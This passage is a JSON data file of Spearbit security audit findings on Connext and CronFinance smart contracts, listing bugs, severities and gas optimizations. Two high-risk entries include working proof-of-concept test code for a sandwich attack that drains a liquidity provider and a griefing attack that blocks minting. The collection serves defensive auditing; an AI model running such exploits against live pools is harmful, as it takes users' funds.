        "body": "The function checker() is relatively difficult to read due to the else if chaining of if statements. As the if statements call return(), the else isn't necessary and the code can be made more readable. function checker() external view override returns (bool canExec, bytes memory execPayload) { bytes32 outboundRoot = CONNECTOR.outboundRoot(); if ((lastExecuted + EXECUTION_INTERVAL) > block.timestamp) { return (false, bytes(\"EXECUTION_INTERVAL seconds are not passed yet\")); } else if (lastRootSent == outboundRoot) { return (false, bytes(\"Sent root is the same as the current root\")); } else { execPayload = abi.encodeWithSelector(this.sendMessage.selector, outboundRoot); return (true, execPayload); } }",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Informational"
        ]
    },
    {
        "title": "Use function addressToBytes32",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "The function dispatch() of SpokeConnector contains an explicit conversion from address to bytes32. There is also a function addressToBytes32() that does the same and is more readable. function dispatch(...) ... { bytes memory _message = Message.formatMessage( ... bytes32(uint256(uint160(msg.sender))), ... );",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Informational"
        ]
    },
    {
        "title": "Balancer Read-Only Reentrancy Vulnerability (Changes from dev team added to audit.)",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/CronFinance-Spearbit-Security-Review.pdf",
        "body": "Balancer's read-only reentrancy vulnerability potentially effects the following Cron-Fi TWAMM func- tions:  getVirtualReserves  getVirtualPriceOracle  executeVirtualOrdersToBlock A mitigation was provided by the Balancer team that uses a minimum amount of gas to trigger a reentrancy check. The Balancer vulnerability is discussed in greater detail here:  reentrancy-vulnerability-scope-expanded/4345",
        "labels": [
            "Spearbit",
            "CronFinance",
            "Severity: High Risk"
        ]
    },
    {
        "title": "Overpayment of one side of LP Pair onJoinPool due to sandwich or user error",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/CronFinance-Spearbit-Security-Review.pdf",
        "body": "Only one of the two incoming tokens are used to determine the amount of pool tokens minted (amountLP) on join amountLP = Math.min( _token0InU112.mul(supplyLP).divDown(_token0ReserveU112), _token1InU112.mul(supplyLP).divDown(_token1ReserveU112) ); In the event the price moves between the time a minter sends their transaction and when it is included in a block, they may overpay for one of _token0InU112 or _token1InU112. This can occur due to user error, or due to being sandwiched. Concrete example: pragma solidity ^0.7.0; pragma experimental ABIEncoderV2; import \"forge-std/Test.sol\"; import \"../HelperContract.sol\"; import { C } from \"../../Constants.sol\"; import { ExecVirtualOrdersMem } from \"../../Structs.sol\"; contract JoinSandwich is HelperContract { uint256 WAD = 10**18; function testManualJoinSandwich() public { 5 address userA = address(this); address userB = vm.addr(1323); // Add some base liquidity from the future attacker. addLiquidity(pool, userA, userA, 10**7 * WAD, 10**7 * WAD, 0); assertEq(CronV1Pool(pool).balanceOf(userA), 10**7 * WAD - C.MINIMUM_LIQUIDITY); // Give userB some tokens to LP with. token0.transfer(userB, 1_000_000 * WAD); token1.transfer(userB, 1_000_000 * WAD); addLiquidity(pool, userB, userB, 10**6 * WAD, 10**6 * WAD, 0); assertEq(CronV1Pool(pool).balanceOf(userB), 10**6 * WAD); exit(10**6 * WAD, ICronV1Pool.ExitType(0), pool, userB); assertEq(CronV1Pool(pool).balanceOf(userB), 0); // Full amounts are returned b/c the exit penalty has been removed (as is being done anyway). assertEq(token0.balanceOf(userB), 1_000_000 * WAD); assertEq(token1.balanceOf(userB), 1_000_000 * WAD); // Now we'll do the same thing, simulating a sandwich from userA. uint256 swapProceeds = swapPoolAddr(5 * 10**6 * WAD, /* unused */ 0, ICronV1Pool.SwapType(0), address(token0), pool, ,! userA); // Original tx from userB is sandwiched now... addLiquidity(pool, userB, userB, 10**6 * WAD, 10**6 * WAD, 0); // Sell back what was gained from the first swap. swapProceeds = swapPoolAddr(swapProceeds, /* unused */ 0, ICronV1Pool.SwapType(0), address(token1), pool, userA); emit log_named_uint(\"swapProceeds 1 to 0\", swapProceeds); // allows seeing what userA lost to fees // Let's see what poor userB gets back of their million token0 and million token1... assertEq(token0.balanceOf(userB), 0); assertEq(token1.balanceOf(userB), 0); exit(ICronV1Pool(pool).balanceOf(userB), ICronV1Pool.ExitType(0), pool, userB); emit log_named_uint(\"userB token0 after\", token0.balanceOf(userB)); emit log_named_uint(\"userB token1 after\", token1.balanceOf(userB)); } } Output: Logs: swapProceeds 1 to 0: 4845178856516554015932796 userB token0 after: 697176321467715374004199 userB token1 after: 687499999999999999999999 1. We have a pool where the attacker is all of the liquidity (107 of each token) 2. A LP tries to deposit another 106 in equal proportions 3. The attacker uses a swap of 5 (cid:3) 106 of one of the tokens to distort the pool. They lose about 155k in the process, but the LP loses far more, nearly all of which goes to the attacker--about 615,324 (sum of the losses of the two tokens since they're equally priced in this example). The attacker could be a significantly smaller proportion of the pool and still find this attack profitable. They could also JIT the liquidity since the early withdrawal penalty has been removed. The attack becomes infeasible for very large pools (has to happen over multiple TXs so can't flash loan --need own capital), but is relevant in practice.",
        "labels": [
            "Spearbit",
            "CronFinance",
            "Severity: High Risk"
        ]
    },
    {
        "title": "Loss of Long-Term Swap Proceeds Likely in Pools With Decimal or Price Imbalances",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/CronFinance-Spearbit-Security-Review.pdf",
        "body": "This TWAMM implementation tracks the proceeds of long-term swaps efficiently via accumulated values called \"scaled proceeds\" for each token. In every order block interval (OBI), the scaled proceeds for e.g. the sale of token 0 are incremented by (quantity of token 1 purchased during the OBI) (cid:3)264= (sales rate of token 0 during the OBI) Then the proceeds of any specific long-term swap can be computed as the product of the difference between the scaled proceeds at the current block (or the expiration block of the order if filled) and the last block for which proceeds were claimed for the order and the order's sales rate, divided by 264: last := min(currentBlock, orderExpiryBlock) prev := block of last proceeds collection, or block order was placed in if this is the first withdrawal LT swap proceeds = (scaledProceedsl ast (cid:0) scaledProceedsprev ) (cid:3) (ordersalesrate)=264 The value 264 is referred to as the \"scaling factor\" and is intended to reduce precision loss in the division to determine the increment to the scaled proceeds. The addition to increment the scaled proceeds and the subtraction to compute its net change is both intentionally done with unchecked arithmetic--since only the difference matters, so long as at most one overflow occurs between claim-of-proceeds events for any given order, the computed proceeds will be correct (up to rounding errors). If two or more overflows occur, however, funds will be lost by the swapper (unclaimable and locked in the contract). Additionally, to cut down on gas costs, the scaled proceeds for the two tokens are packed into a single storage slot, so that only 128 bits are available for each value. This makes multiple overflows within the lifetime of a single order more likely. The CronFi team was aware of this at the start of the audit and specifically requested it be investigated, though they expected a maximum order length of 5 years to be sufficient to avoid the issue in practice. The scaling factor of 264 is approximately 1.8 (cid:3) 1019, close to the unit size of an 18-decimal token. It indeed works well if both pool tokens have similar decimals and relative prices that do not differ by too many orders of magnitude, as the quantity purchased and the sales rate will then be of similar magnitude, canceling to within a few powers of ten (2128 3.4 (cid:3) 1038, leaving around 19 orders of magnitude after accounting for the scaling factor). However, in pools with large disparities in price, decimals, or both, numerical issues are easy to encounter. The most extreme, realistic example would be a DAI-GUSD pool. DAI has 18 decimals while GUSD has only 2. We will treat the price of DAI and GUSD as equal for this analysis, as they are both stablecoins, and arbitrage of the TWAMM pool should prevent large deviations. Selling GUSD at a rate of 1000 per block, with an OBI of 64 (the stable pool order block interval in the audited commit) results in an increment of the scaled proceeds per OBI of: increment = (64 (cid:3) 1000 (cid:3) 1018) (cid:3) 264=(1000 (cid:3) 102) = 1.18 (cid:3) 1037 7 This will overflow an unsigned 128 bit integer after 29 OBIs; at 12 seconds per block, this means the first overflow occurs after 12 (cid:3) 64 (cid:3) 29 = 22272 seconds or about 6.2 hours, and thus the first double overflow (and hence irrevocable loss of proceeds if a withdrawal is not executed in time) will occur within about 12.4 hours (slightly but not meaningfully longer if the price is pushed a bit below 1:1, assuming a deep enough pool or reasonably efficient arbitrage). Since the TWAMM is intended to support swaps that take days, weeks, months, or even years to fill, without requiring constant vigilance from every long-term swapper, this is a strong violation of safety. A less extreme but more market-relevant example would be a DAI-WBTC pool. WBTC has 8 instead of 2 decimals, but it is also more than four orders of magnitude more valuable per token than DAI, making it only about 2 orders of magnitude \"safer\" than a DAI-GUSD pool. Imitating the above calculation with 20_000 DAI = 1 WBTC and selling 0.0025 WBTC (~$50) per block with a 257 block OBI yields: increment = (257 (cid:3) 50 (cid:3) 1018) (cid:3) 264=(0.0025 (cid:3) 108) = 9.48 (cid:3) 1035 OBI to overflow = ceiling(2128=(9.48 (cid:3) 1035)) = 359 time to overflow = 12 (cid:3) 257 (cid:3) 359 = 1107156 seconds = 307 hours = 12.8 days , or a little more than a day to encounter the second overflow. While less bad than the DAI-GUSD example, this is still likely of significant concern given that the CronFi team indicated these are parameters under which the TWAMM should be able to function safely and DAI-WBTC is a pair of interest for the v1 product. It is worth noting that these calculations are not directly dependent on the quantity being sold so long as the price stays roughly constant--any change in the selling rate will be compensated by a proportional change in the proceeds quantity as their ratio is determined by price. Thus the analysis depends only on relative price and relative decimals, to a good approximation--so a WBTC-DAI pool can be expected to experience an overflow roughly every two weeks at prevailing market prices, so long as the net selling rate is non-zero.",
        "labels": [
            "Spearbit",
            "CronFinance",
            "Severity: High Risk"
        ]
    },
    {
        "title": "An attacker can block any address from joining the Pool and minting BLP Tokens by filling the joinEventMap mapping.",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/CronFinance-Spearbit-Security-Review.pdf",
        "body": "An attacker can block any address from minting BLP Tokens. This occurs due to the MAX_JOIN_- EVENTS limit, which is present in the JoinEventLib library. The goal for an attacker is to block a legitimate user from minting BLP Tokens, by filling the joinEventMap mapping. The attacker can fill the joinEventMap mapping by performing the following steps:  The attacker mints BLP Tokens from 50 different addresses.  Each address transfers the BLP Tokens, alongside the join events, to the user targeted with a call to the CronV1Pool(pool).transfer and CronV1Pool(pool).transferJoinEvent functions respectively. Those transfers should happen in different blocks. After 50 blocks (50 * 12s = 10 minutes) the attacker has blocked the legitimate user from minting _BLP Tokens_, as the maximum size of the joinEventMap mapping has been reached. 8 The impact of this vulnerability can be significant, particularly for smart contracts that allow users to earn yield by providing liquidity in third-party protocols. For example, if a governance proposal is initiated to generate yield by providing liquidity in a CronV1Pool pool, the attacker could prevent the third-party protocol from integrating with the CronV1Pool protocol. A proof-of-concept exploit demonstrating this vulnerability can be found below: function testGriefingAttack() public { console.log(\"-----------------------------\"); console.log(\"Many Users mint BLP tokens and transfer the join events to the user 111 in order to fill the array!\"); ,! for (uint j = 1; j < 51; j++) { _addLiquidity(pool, address(j), address(j), 2_000, 2_000, 0); vm.warp(block.timestamp + 12); vm.startPrank(address(j)); //transfer the tokens CronV1Pool(pool).transfer(address(111), CronV1Pool(pool).balanceOf(address(j))); //transfer the join events to the address(111) CronV1Pool(pool).transferJoinEvent(address(111), 0 , CronV1Pool(pool).balanceOf(address(j))); vm.stopPrank(); } console.log(\"Balance of address(111) before minting LP Tokens himself\", ,! ICronV1Pool(pool).balanceOf(address(111))); //user(111) wants to enter the pool _addLiquidity(pool, address(111), address(111), 5_000, 5_000, 0); console.log(\"Join Events of user address(111): \", ICronV1Pool(pool).getJoinEvents(address(111)).length); console.log(\"Balance of address(111) after adding the liquidity: \", ICronV1Pool(pool).balanceOf(address(111))); ,! ,! }",
        "labels": [
            "Spearbit",
            "CronFinance",
            "Severity: High Risk"
        ]
    },
    {
        "title": "The executeVirtualOrdersToBlock function updates the oracle with the wrong block.number",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/CronFinance-Spearbit-Security-Review.pdf",
        "body": "The executeVirtualOrdersToBlock is external, meaning anyone can call this function to execute virtual orders. The _maxBlock parameter can be lower block.number which will make the oracle malfunction as the oracle update function _updateOracle uses the block.timestamp and assumes that the update was called with the reserves at the current block. This will make the oracle update with an incorrect value when _maxBlock can be lower than block.number.",
        "labels": [
            "Spearbit",
            "CronFinance",
            "Severity: High Risk"
        ]
    },
    {
        "title": "The _join function does not check if the recipient is address(0)",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/CronFinance-Spearbit-Security-Review.pdf",
        "body": "As stated within the Balancer's PoolBalances.sol // The Vault ignores the `recipient` in joins and the `sender` in exits: it is up to the Pool to keep track of ,! // their participation. The recipient is not checked if it's the address(0), that should happen within the pool implementation. Within the Cron implementation, this check is missing which can cause losses of LPs if the recipient is sent as address(0). This can have a high impact if a 3rd party integration happens with the Cron pool and the \"joiner\" is mistakenly sending an address(0). This becomes more dangerous if the 3rd party is a smart contract implementation that connects with the Cron pool, as the default value for an address is the address(0), so the probability of this issue occurring increases.",
        "labels": [
            "Spearbit",
            "CronFinance",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Canonical token pairs can be griefed by deploying new pools with malicious admins",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/CronFinance-Spearbit-Security-Review.pdf",
        "body": "function create( address _token0, address _token1, string memory _name, string memory _symbol, uint256 _poolType, address _pauser ) external returns (address) { CronV1Pool.PoolType poolType = CronV1Pool.PoolType(_poolType); requireErrCode(_token0 != _token1, CronErrors.IDENTICAL_TOKEN_ADDRESSES); (address token0, address token1) = _token0 < _token1 ? (_token0, _token1) : (_token1, _token0); requireErrCode(token0 != address(0), CronErrors.ZERO_TOKEN_ADDRESSES); requireErrCode(getPool[token0][token1][_poolType] == address(0), CronErrors.EXISTING_POOL); address pool = address( new CronV1Pool(IERC20(_token0), IERC20(_token1), getVault(), _name, _symbol, poolType, ,! address(this), _pauser) ); //... Anyone can permissionlessly deploy a pool, with it then becoming the canonical pool for that pair of tokens. An attacker is able to pass a malicious _pauser the twamm pool, preventing the creation of a legitimate pool of the same type and tokens. This results in race conditions between altruistic and malicious pool deployers to set the admin for every token pair. 10 Malicious actors may grief the protocol by attempting to deploy token pairs with and exploiting the admin address, either deploying the pool in a paused state, effectively disabling trading for long-term swaps with the pool, pausing the pool at an unknown point in the future, setting fee and holding penalty parameters to inappropriate values, or setting illegitimate arbitrage partners and lists. This requires the factory owner to remove the admin of each pool individually and to set a new admin address, fee parameters, holding periods, pause state, and arbitrage partners in order to recover each pool to a usable condition if the griefing is successful.",
        "labels": [
            "Spearbit",
            "CronFinance",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Refund Computation in _withdrawLongTermSwap Contains A Risky Underflow",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/CronFinance-Spearbit-Security-Review.pdf",
        "body": "Nothing prevents lastVirtualOrderBlock from advancing beyond the expiry of any given long-term swap, so the unchecked subtraction here is unsafe and can underflow. Since the resulting refund value will be extremely large due to the limited number of blocks that can elapse and the typical prices and decimals of tokens, the practical consequence will be a revert due to exceeding the pool and order balances. However, this could be used to steal funds if the value could be maliciously tuned, for example via another hypothetical bug that allowed the last virtual order block or the sales rate of an order to be manipulated to an arbitrary value.",
        "labels": [
            "Spearbit",
            "CronFinance",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Function transferJoinEvent Permits Transfer-to-Self",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/CronFinance-Spearbit-Security-Review.pdf",
        "body": "Though the error code indicates the opposite intent, this check will permit transfer-to-self (|| used instead of &&).",
        "labels": [
            "Spearbit",
            "CronFinance",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "One-step owner change for factory owner",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/CronFinance-Spearbit-Security-Review.pdf",
        "body": "The factory owner can be changed with a single transaction. As the factory owner is critical to managing the pool fees and other settings an incorrect address being set as the owner may result in unintended behaviors.",
        "labels": [
            "Spearbit",
            "CronFinance",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Factory owner may front run large orders in order to extract fees",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/CronFinance-Spearbit-Security-Review.pdf",
        "body": "The factory owner may be able to front-run large trades in order to extract more fees if compromised or becomes malicious in one way or another. Similarly, pausing may also allow for skipping the execution of virtual orders before exiting.",
        "labels": [
            "Spearbit",
            "CronFinance",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Join Events must be explicitly transfered to recipient after transfering Balancer Pool Tokens in order to realize the full value of the tokens",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/CronFinance-Spearbit-Security-Review.pdf",
        "body": "Any user receiving LP tokens transferred to them must be explicitly transferred with a join event in order to redeem the full value of the LP tokens on exit, otherwise the address transferred to will automatically get the holding penalty when they try to exit the pool. Unless a protocol specifically implements transferJoinEvent function compatibility all LP tokens going through that protocol will be worth a fraction of their true value even after the holding period has elapsed.",
        "labels": [
            "Spearbit",
            "CronFinance",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Order Block Intervals(OBI) and Max Intervals are calculated with 14 second instead of 12 second block times",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/CronFinance-Spearbit-Security-Review.pdf",
        "body": "The CronV1Pool contract calculates both the Order Block Intervals (OBI) and the Max Intervals of the Stable/Liquid/Volatile pairs with 14 second block times. However, after the merge, 12 second block time is enforced by the Beacon Chain.",
        "labels": [
            "Spearbit",
            "CronFinance",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "One-step status change for pool Admins",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/CronFinance-Spearbit-Security-Review.pdf",
        "body": "Admin status can be changed in a single transaction. This may result in unintended behaviour if the incorrect address is passed.",
        "labels": [
            "Spearbit",
            "CronFinance",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Incomplete token simulation in CronV1Pool due to missing queryJoin and queryExit functions",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/CronFinance-Spearbit-Security-Review.pdf",
        "body": "he CronV1Pool contract is missing the queryJoin and queryExit functions, which are significant for calculating maxAmountsIn and/or minBptOut on pool joins, and minAmountsOut and/or maxBptIn on pool exits, respectively. The ability to calculate these values is very important in order to ensure proper enforcement of slippage tolerances and mitigate the risk of sandwich attacks.",
        "labels": [
            "Spearbit",
            "CronFinance",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "A partner can trigger ROC update",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/CronFinance-Spearbit-Security-Review.pdf",
        "body": "A partner can trigger rook update if they return rook's current list within an update.  Scenario A partner calls updateArbitrageList, the IArbitrageurList(currentList).nextList() returns rook's rook- PartnerContractAddr and gets updated, the partner calls updateArbitrageList again, so this time isRook will be true.",
        "labels": [
            "Spearbit",
            "CronFinance",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Approved relayer can steal cron's fees",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/CronFinance-Spearbit-Security-Review.pdf",
        "body": "A relayer within Balancer is set per vault per address. If feeAddr will ever add a relayer within the balancer vault, the relayer can call exitPool with a recipient of their choice, and the check on line 225 will pass as the sender will still be feeAddr but the true msg.sender is the relayer.",
        "labels": [
            "Spearbit",
            "CronFinance",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Price Path Due To Long-Term Orders Neglected In Oracle Updates",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/CronFinance-Spearbit-Security-Review.pdf",
        "body": "The _updateOracle() function takes its price sample as the final price after virtual order execution for whatever time period has elapsed since the last join/exit/swap. Since the price changes continuously during that interval if there are long-term orders active (unlike in Uniswap v2 where the price is constant between swaps), this is inaccurate - strictly speaking, one should integrate over the price curve as defined by LT orders to get a correct sample. The longer the interval, the greater the potential for inaccuracy.",
        "labels": [
            "Spearbit",
            "CronFinance",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Vulnerabilities noted from npm audit",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/CronFinance-Spearbit-Security-Review.pdf",
        "body": "npm audit notes: 76 vulnerabilities (5 low, 16 moderate, 27 high, 28 critical).",
        "labels": [
            "Spearbit",
            "CronFinance",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Optimization: Merge CronV1Pool.sol & VirtualOrders.sol (Changes from dev team added to audit.)",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/CronFinance-Spearbit-Security-Review.pdf",
        "body": "A lot of needless parameter passing is done to accommodate the file barrier between CronV1Pool & VirtualOrdersLib, which is an internal library. Some parameters are actually immutable variables.",
        "labels": [
            "Spearbit",
            "CronFinance",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Receive sorted tokens at creation to reduce complexity",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/CronFinance-Spearbit-Security-Review.pdf",
        "body": "Currently, when a pool is created, within the constructor, logic is implemented to determine if the to- kens are sorted by address. A requirement that is needed for Balancer Pool creation. This logic adds unnecessary gas consumption and complexity throughout the contract as every time amounts are retrieved from balancer, the Cron Pool must check the order of the tokens and make sure that the difference between sorted (Balancer) and unsorted (Cron) token addresses is handled. An example can be seen in onJoinPool uint256 token0InU112 = amountsInU112[TOKEN0_IDX]; uint256 token1InU112 = amountsInU112[TOKEN1_IDX]; Where the amountsInU112 are retrieved from the balancer as a sorted array, index 0 == token0 and index 1 == token1, but on the Cron side, we must make sure that we retrieved the correct amount based on the tokens being sent as sorted or not when the pool was created.",
        "labels": [
            "Spearbit",
            "CronFinance",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Remove double reentrancy checks",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/CronFinance-Spearbit-Security-Review.pdf",
        "body": "A number of CronV1Pool functions include reentrancy checks, however, they are only callable from a Balancer Vault function that already has a reentrancy check.",
        "labels": [
            "Spearbit",
            "CronFinance",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "TWAMM Formula Computation Can Be Made Correct-By-Construction and Optimized",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/CronFinance-Spearbit-Security-Review.pdf",
        "body": "The linked lines are the core calculation of TWAMM virtual order execution. They involve checked arithmetic in the form of underflow-checked subtractions; there is thus a theoretical risk that rounding error could lead to a \"freezing\" of a TWAMM pool. One of the subtractions, that for token1OutU112, is already \"correct-by- construction\", i.e. it can never underflow. The calculation of token0OutU112 can be reformulated to be explicitly safe as well; the following overall refactoring is suggested: uint256 ammEndToken0 = (token1ReserveU112 * sum0) / sum1; uint256 ammEndToken1 = (token0ReserveU112 * sum1) / sum0; token0ReserveU112 = ammEndToken0; token1ReserveU112 = ammEndToken1; token0OutU112 = sum0 - ammEndToken0; token1OutU112 = sum1 - ammEndToken1; Both output calculations are now of the form x (cid:0) (x (cid:3) y)=(y + z) for non-negative x, y , and z, allowing subtraction operations to be unchecked, which is both a gas optimization and gives confidence the calculation cannot freeze up unexpectedly due to an underflow. Replacement of divDown by / gives equivalent semantics with lower overhead. An additional advantage of this formulation is its manifest symmetry under 0 < (cid:0) > 1 interchange; this serves as a useful heuristic check on the computation, as it should possess the same symmetry as the invariant.",
        "labels": [
            "Spearbit",
            "CronFinance",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Gas Optimizations In Bit Packing Functions",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/CronFinance-Spearbit-Security-Review.pdf",
        "body": "The bit packing operations are heavily used throughout the gas-critical swap code path, the opti- mization of which was flagged as high-priority by the CronFi team. Thus they were carefully reviewed not just for correctness, but also for gas optimization. L119: unnecessary & due to check on L116 L175: could hardcode clearMask L203: could hardcode clearMask L240: could hardcode clearMask L241: unnecessary & due to check on line 237 L242: unnecessary & due to check on line 238 L292: could hardcode clearMask L328: could hardcode clearMask L343: unnecessary to mask when _isWord0 == true L359: unnecessary & operations due to checks on lines 356 and 357 L372: unnecessary masking L389: could hardcode clearMask L390: unnecessary & due to check on L387 L415: could 16 hardcode clearMask L416: unnecessary & operation due to check on line 413 L437: unnecessary clearMask L438: unnecessary & due to check on line 435 L464: could hardcode clearMask L465: unnecessary & due to check on line 462 Additionally, the following code pattern appears in multiple places: requireErrCode(increment <= CONST, CronErrors.INCREMENT_TOO_LARGE); value += increment; requireErrCode(value <= CONST, CronErrors.OVERFLOW); Unless there's a particular reason to want to detect a too-large increment separately from an overflow, these patterns could all be simplified to requireErrCode(CONST - value >= increment, CronErrors.OVERFLOW); value += increment; as any increment greater than CONST will cause overflow anyway and value is always in the correct range by construction. This allows CronErrors.INCREMENT_TOO_LARGE to be removed as well.",
        "labels": [
            "Spearbit",
            "CronFinance",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Using extra storage slot to store two mappings of the same information",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/CronFinance-Spearbit-Security-Review.pdf",
        "body": "A second storage slot is used to store a duplicate mapping of the same token pair but in reverse order. If the tokens are sorted in a getter function then the second mapping does not need to be used.",
        "labels": [
            "Spearbit",
            "CronFinance",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Gas optimizations within _executeVirtualOrders function",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/CronFinance-Spearbit-Security-Review.pdf",
        "body": "Within the _executeVirtualOrders function there are a few gas optimizations that can be applied to reduce the contract size and gas consumed while the function is called. (!(virtualOrders.lastVirtualOrderBlock < _maxBlock && _maxBlock < block.number)) Is equivalent with: (virtualOrders.lastVirtualOrderBlock >= _maxBlock || _maxBlock >= block.number) This means that this always enters if _maxBlock == block.number which will result in unnecessary gas consump- tion. If cron fee is enabled, evoMem.feeShiftU3 will have a value meaning that the check on line 1536 is obsolete. Removing that check and the retrieve from storage will save gas.",
        "labels": [
            "Spearbit",
            "CronFinance",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Initializing with default value is consuming unnecessary gas",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/CronFinance-Spearbit-Security-Review.pdf",
        "body": "Every variable declaration followed by initialization with a default value is gas consuming and obso- lete. The provided line within the context is just an example.",
        "labels": [
            "Spearbit",
            "CronFinance",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Factory requirement can be circumvented within the constructor",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/CronFinance-Spearbit-Security-Review.pdf",
        "body": "The constructor checks if the _factory parameter is the msg.sender. This behavior was, at first, created so that only the factory would be able to deploy pools. The check on line 484 is obsolete as pools deployed via the factory, will always have msg.sender == factory address, making the _factory parameter obsolete as well.",
        "labels": [
            "Spearbit",
            "CronFinance",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Usability: added remove, set pool functionality to CronV1PoolFactory (Changes from dev team added to audit.)",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/CronFinance-Spearbit-Security-Review.pdf",
        "body": "Conversations with the audit team indicated functions were needed to manage pool mappings post- creation in the event that a pool needed to be deprecated or replaced.",
        "labels": [
            "Spearbit",
            "CronFinance",
            "Severity: Informational"
        ]
    },
    {
        "title": "Virtual oracle getter--gets oracle value at block > lvob (Changes from dev team added to audit.)",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/CronFinance-Spearbit-Security-Review.pdf",
        "body": "Through the audit process, sufficient contract space became available to add an oracle getter con- venience that returns the oracle values and timestamps. However, this leaves the problem of not being able to get the oracle price at the current block in a pool with low volume but virtual orders active.",
        "labels": [
            "Spearbit",
            "CronFinance",
            "Severity: Informational"
        ]
    },
    {
        "title": "Loss of assets due to rounding during _longTermSwap",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/CronFinance-Spearbit-Security-Review.pdf",
        "body": "When a long term swap (LT) is created, the selling rate for that LT is set based on the amount and the number of blocks that order will be traded for. uint256 lastExpiryBlock = block.number - (block.number % ORDER_BLOCK_INTERVAL); uint256 orderExpiry = ORDER_BLOCK_INTERVAL * (_orderIntervals + 1) + lastExpiryBlock; // +1 protects from div 0 ,! uint256 tradeBlocks = orderExpiry - block.number; uint256 sellingRateU112 = _amountInU112 / tradeBlocks; During the computation of the number of blocks, the order must trade for, defined as tradeBlocks, the order expiry is computed from the last expiry block based on the OBI (Order Block Interval). If tradeBlocks is big enough (it can be a max of 176102 based on the STABLE_MAX_INTERVALS ), then sellingRa- teU112 will suffer a loss due to solidity rounding down behavior. This is a manageable loss for tokens with big decimals but for tokens with low decimals, will create quite an impact. E.g. wrapped BTC has 8 decimals. the MAX_ORDER_INTERVALS can be max 176102 as per stable max intervals defined within the constants. that being said a user can lose quite a significant value of BTC: 0.00176101 This issue is marked as Informational severity as the amount lost might not be that significant. This can change in the future if the token being LTed has a big value and a small number of decimals.",
        "labels": [
            "Spearbit",
            "CronFinance",
            "Severity: Informational"
        ]
    },
    {
        "title": "Inaccuracies in Comments",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/CronFinance-Spearbit-Security-Review.pdf",
        "body": "A number of minor inaccuracies were discovered in comments that could impact the comprehensi- bility of the code to future maintainers, integrators, and extenders. [1] bit-0 should be bit-1 [2] less than should be at most [3] Maximally Extracted Value should be Maximal Extractable Value see flashbots.net [4] Maximally Extracted Value should be Maximal Extractable Value see flashbots.net [5] on these lines unsold should be sold [6] These comments are not applicable to the code block below them, as they mention looping but no looping is done; it seems they were copied over from the loop 19 on line 54. [7] These comments are not applicable to the code block below them, as they mention looping but no looping is done; it seems they were copied over from the loop on line 111. [8] omitted should be emitted",
        "labels": [
            "Spearbit",
            "CronFinance",
            "Severity: Informational"
        ]
    },
    {
        "title": "Unsupported SwapKind.GIVEN_OUT may limit the compatibility with Balancer",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/CronFinance-Spearbit-Security-Review.pdf",
